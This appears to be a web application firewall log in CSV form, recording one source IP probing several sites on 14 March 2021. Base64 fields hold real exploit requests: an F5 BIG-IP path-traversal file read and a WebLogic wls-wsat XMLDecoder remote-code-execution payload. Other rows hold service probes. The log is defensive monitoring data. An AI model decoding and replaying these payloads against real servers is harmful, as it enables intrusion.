targetcity,sdate,postdata,ip,subtypeid,domain,vip,logflag,sips,targetcountry,targetprovince,city,src_port,province,platform,parameter,ruledesc,refer,eventid,starttime,wafhostname,xff,host,cookie,typeid,matchdata,newlog_time,url,type,rule,method,subtype,dst_port,actionflag,country,useragent,atdid
,2021-03-14T20:56:58,ZmlsZU5hbWU9JTJGZXRjJTJGZjUtcmVsZWFzZQ==,81.68.156.2,24013,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,40348,,anyu,-,F5 big ip any files read vuln,http://111.1.30.69:443/,1249-1615755418.298-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,24,L3RtdWkvbG9naW4uanNwLy4uOy90bXVpL2xvY2FsbGIvd29ya3NwYWNlL2ZpbGVSZWFkLmpzcA==,2021-03-14,/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp,Other,Other_F5_001,POST,F5 Attack,443,BLOCK,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:49,-,81.68.156.2,003,,121.32.243.71,-,,,,52312,,,-,request header invalid,-,1249-1615746829.432-waf03fst,0,waf03.anyu.fst.360es.cn,-,,-,27,R0VUIC8gSFRUUC8xLjANCg0K,2021-03-14,/,protocol invalidation,no host header,GET,request header not valid,-,-,,-,0
,2021-03-14T19:37:48,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz48c29hcGVudjpFbnZlbG9wZSB4bWxuczpzb2FwZW52PSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9zb2FwL2VudmVsb3BlLyIgeG1sbnM6d3NhPSJodHRwOi8vd3d3LnczLm9yZy8yMDA1LzA4L2FkZHJlc3NpbmciIHhtbG5zOmFzeT0iaHR0cDovL3d3dy5iZWEuY29tL2FzeW5jL0FzeW5jUmVzcG9uc2VTZXJ2aWNlIj48c29hcGVudjpIZWFkZXI+PHdzYTpBY3Rpb24+ZmZmPC93c2E6QWN0aW9uPjx3c2E6UmVsYXRlc1RvPmhlbGxvPC93c2E6UmVsYXRlc1RvPjx3b3JrOldvcmtDb250ZXh0IHhtbG5zOndvcms9Imh0dHA6Ly9iZWEuY29tLzIwMDQvMDYvc29hcC93b3JrYXJlYS8iPjxqYXZhPjxzdHJpbmc+PGNsYXNzPjxzdHJpbmc+b3JnLnNsZjRqLmV4dC5FdmVudERhdGE8L3N0cmluZz48dm9pZD48c3RyaW5nPjwhW0NEQVRBWzxqYXZhPjx2b2lkIGNsYXNzPSJqYXZhLmxhbmcuVGhyZWFkIiBtZXRob2Q9ImN1cnJlbnRUaHJlYWQiPjx2b2lkIG1ldGhvZD0iZ2V0Q3VycmVudFdvcmsiIGlkPSJjdXJyZW50X3dvcmsiPjx2b2lkIG1ldGhvZD0iZ2V0Q2xhc3MiPjx2b2lkIG1ldGhvZD0iZ2V0RGVjbGFyZWRGaWVsZCI+PHN0cmluZz5jb25uZWN0aW9uSGFuZGxlcjwvc3RyaW5nPjx2b2lkIG1ldGhvZD0ic2V0QWNjZXNzaWJsZSI+PGJvb2xlYW4+dHJ1ZTwvYm9vbGVhbj48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJnZXQiPjxvYmplY3QgaWRyZWY9ImN1cnJlbnRfd29yayIvPjx2b2lkIG1ldGhvZD0iZ2V0U2VydmxldFJlcXVlc3QiPjx2b2lkIG1ldGhvZD0iZ2V0UmVzcG9uc2UiPjx2b2lkIG1ldGhvZD0iZ2V0U2VydmxldE91dHB1dFN0cmVhbSI+PHZvaWQgbWV0aG9kPSJ3cml0ZSI+PGFycmF5IGNsYXNzPSJieXRlIiBsZW5ndGg9IjkiPjx2b2lkIGluZGV4PSIwIj48Ynl0ZT41MDwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjEiPjxieXRlPjUwPC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iMiI+PGJ5dGU+NTM8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSIzIj48Ynl0ZT41NTwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjQiPjxieXRlPjU1PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iNSI+PGJ5dGU+NTE8L2J5dGU+PC92b2lkPjx2b2lkIGluZGV4PSI2Ij48Ynl0ZT40ODwvYnl0ZT48L3ZvaWQ+PHZvaWQgaW5kZXg9IjciPjxieXRlPjU3PC9ieXRlPjwvdm9pZD48dm9pZCBpbmRleD0iOCI+PGJ5dGU+NDk8L2J5dGU+PC92b2lkPjwvYXJyYXk+PC92b2lkPjx2b2lkIG1ldGhvZD0iZmx1c2giLz48L3ZvaWQ+PHZvaWQgbWV0aG9kPSJnZXRXcml0ZXIiPjx2b2lkIG1ldGhvZD0id3JpdGUiPjxzdHJpbmcvPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvdm9pZD48L3ZvaWQ+PC92b2lkPjwvamF2YT5dXT48L3N0cmluZz48L3ZvaWQ+PC9jbGFzcz48L3N0cmluZz48L2phdmE+PC93b3JrOldvcmtDb250ZXh0Pjwvc29hcGVudjpIZWFkZXI+PHNvYXBlbnY6Qm9keT48YXN5Om9uQXN5bmNEZWxpdmVyeS8+PC9zb2FwZW52OkJvZHk+PC9zb2FwZW52OkVudmVsb3BlPg==,81.68.156.2,24003,nhqzx.com,42.81.56.38,-,|DM117.149.146.17,,,,46172,,anyu,-,rce_java_with_lang_01,http://117.149.146.17:443/,1249-1615750668.263-w-waf04tjgt,0,w-waf04.anyu.tjgt.360es.cn,81.68.156.2,www.nhqzx.com,-,24,-,2021-03-14,/wls-wsat/CoordinatorPortType,Other,rce_java_with_lang_01,POST,Malware Characteristic,443,PASS,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
,2021-03-14T18:33:42,-,81.68.156.2,002,,121.32.243.71,-,,,,59790,,,-,request method not valid,-,1249-1615746822.037-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,KjINCiQ0DQphdXRoDQokNQ0KNTQzMjENCg==,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T19:43:03,-,81.68.156.2,002,,121.32.243.71,-,,,,49638,,,-,parse request line failed,-,1249-1615750978.888-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,V1dXT0ZGTEUgU1RBVFVTDQo=,2021-03-14,-,protocol invalidation,parse request line failed,,request line not valid,,-,,-,0
,2021-03-14T18:31:51,-,81.68.156.2,003,,121.32.243.71,-,,,,42700,,,-,request header invalid,-,1249-1615746711.654-waf03fst,0,waf03.anyu.fst.360es.cn,-,,-,27,T1BUSU9OUyAvIEhUVFAvMS4wDQoNCg==,2021-03-14,/,protocol invalidation,no host header,OPTIONS,request header not valid,-,-,,-,0
,2021-03-14T18:33:28,-,81.68.156.2,002,,121.32.243.71,-,,,,48048,,,-,request method not valid,-,1249-1615746808.869-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:45,-,81.68.156.2,002,,121.32.243.71,-,,,,47204,,,-,request method not valid,-,1249-1615746765.46-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,AB4ABgEAAAEAAAAAAAAHdmVyc2lvbgRiaW5kAAAQAAM=,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:45,-,81.68.156.2,002,,121.32.243.71,-,,,,40948,,,-,request method not valid,-,1249-1615746765.709-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,SEVMUA0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T18:32:45,-,81.68.156.2,002,,121.32.243.71,-,,,,59930,,,-,request method not valid,-,1249-1615746765.368-waf02fst,0,waf02.anyu.fst.360es.cn,-,,-,27,RUhMTw0K,2021-03-14,-,protocol invalidation,request method not valid,,request line not valid,,-,,-,0
,2021-03-14T20:10:05,-,81.68.156.2,13001,hcyjw.cn,42.81.56.38,-,|DM111.1.29.224|DM111.1.29.223|DM111.1.30.69,,,,32930,,anyu,-,information leak attack with crossdomain file,http://111.1.29.223:443/,1149-1615752605.147-s1jhb-w-waf01tjgt,0,w-waf01.anyu.tjgt.360es.cn,81.68.156.2,www.hcyjw.cn,-,13,Y3Jvc3Nkb21haW4ueG1s,2021-03-14,/crossdomain.xml,Information Leak Attack,information_leak_with_crossdomain_01,GET,Infomation Leak Attack,443,PASS,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",0
